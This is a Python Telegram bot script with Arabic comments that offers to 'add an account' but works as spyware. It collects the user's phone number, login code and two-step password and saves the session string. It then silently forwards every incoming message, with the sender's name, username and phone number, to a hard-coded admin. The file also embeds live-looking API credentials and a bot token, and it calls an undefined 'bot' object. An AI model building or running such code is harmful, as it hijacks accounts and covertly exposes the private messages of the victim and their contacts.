import os
from telethon.sessions import StringSession
import asyncio, json
from kvsqlite.sync import Client as uu
from telethon import TelegramClient, events, Button
from telethon.errors import (
    ApiIdInvalidError,
    PhoneNumberInvalidError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    SessionPasswordNeededError,
    PasswordHashInvalidError
)

# إعدادات البوت
API_ID = "21669021"
API_HASH = "bcdae25b210b2cbe27c03117328648a2"
admin = 7072622935
token = "7315494223:AAFs_jejjsSrP7J8bDSprHM7KhAJ2nz3tSc"

# إنشاء الجلسة
client = TelegramClient('BotSession', API_ID, API_HASH).start(bot_token=token)
db = uu('database/elhakem.ss', 'bot')

if not db.exists("account"):
    db.set("account", {})

# دالة لإنشاء الأزرار
def main_buttons():
    return [[Button.inline("➕ إضافة حساب", data="add")]]

@client.on(events.NewMessage(pattern="/start", func=lambda x: x.is_private))
async def start(event):
    await event.reply(
        "👋 أهلاً بك! اضغط على الزر أدناه لإضافة حساب.",
        buttons=main_buttons()
    )

@client.on(events.callbackquery.CallbackQuery(data="add"))
async def add_account(event):
    account = db.get("account")
    if account:
        await event.edit("⚠️ يوجد حساب بالفعل. لا يمكن إضافة أكثر من حساب واحد.")
        return

    async with client.conversation(event.chat_id) as conv:
        await conv.send_message("✔️ الرجاء إرسال رقمك مع رمز الدولة، مثال: +201000000000")
        phone_number = (await conv.get_response()).text.strip()

        app = TelegramClient(StringSession(), API_ID, API_HASH)
        await app.connect()

        try:
            await app.send_code_request(phone_number)
            await conv.send_message("🔑 تم إرسال كود التحقق إلى تليجرام. الرجاء إدخال الكود بالشكل: 12345")
            code = (await conv.get_response()).text.strip()

            try:
                await app.sign_in(phone_number, code)
                string_session = app.session.save()
                db.set("account", {"phone_number": phone_number, "session": string_session})
                await conv.send_message("✅ تم تسجيل الحساب بنجاح!", buttons=main_buttons())
            except (PhoneCodeInvalidError, PhoneCodeExpiredError):
                await conv.send_message("❌ الكود غير صحيح أو منتهي الصلاحية.")
            except SessionPasswordNeededError:
                await conv.send_message("🔑 يرجى إدخال كلمة مرور التحقق بخطوتين:")
                password = (await conv.get_response()).text.strip()
                try:
                    await app.sign_in(password=password)
                    string_session = app.session.save()
                    db.set("account", {"phone_number": phone_number, "session": string_session})
                    await conv.send_message("✅ تم تسجيل الحساب بنجاح!", buttons=main_buttons())
                except PasswordHashInvalidError:
                    await conv.send_message("❌ كلمة المرور غير صحيحة.")
        except (ApiIdInvalidError, PhoneNumberInvalidError):
            await conv.send_message("❌ هناك خطأ في API_ID أو HASH_ID أو رقم الهاتف.")
        finally:
            await app.disconnect()

# دالة لمراقبة الرسائل الواردة من حساب المستخدم وإرسالها للمسؤول
async def monitor_user_messages():
    account = db.get("account")
    if account:
        session = StringSession(account['session'])
        user_client = TelegramClient(session, API_ID, API_HASH)
        await user_client.connect()

        @user_client.on(events.NewMessage(incoming=True))
        async def handle_incoming_message(event):
            sender = await event.get_sender()
            sender_info = {
                "ID": sender.id,
                "اسم المستخدم": sender.username or "N/A",
                "الاسم": sender.first_name or "N/A",
                "رقم الهاتف": sender.phone or "N/A",
                "الرسالة": event.message.message,
                "تاريخ الإرسال": str(event.message.date)
            }
            # إرسال المعلومات إلى المسؤول
            await bot.send_message(admin, f"📝 رسالة جديدة من {sender_info['اسم المستخدم']}:\n{json.dumps(sender_info, ensure_ascii=False, indent=2)}")

        await user_client.run_until_disconnected()

# بدء مراقبة الرسائل في حساب المستخدم بعد تسجيله
async def start_monitoring():
    while True:
        account = db.get("account")
        if account:
            await monitor_user_messages()
        await asyncio.sleep(5)

# تشغيل المراقبة كجزء من البوت
client.loop.create_task(start_monitoring())
client.run_until_disconnected()
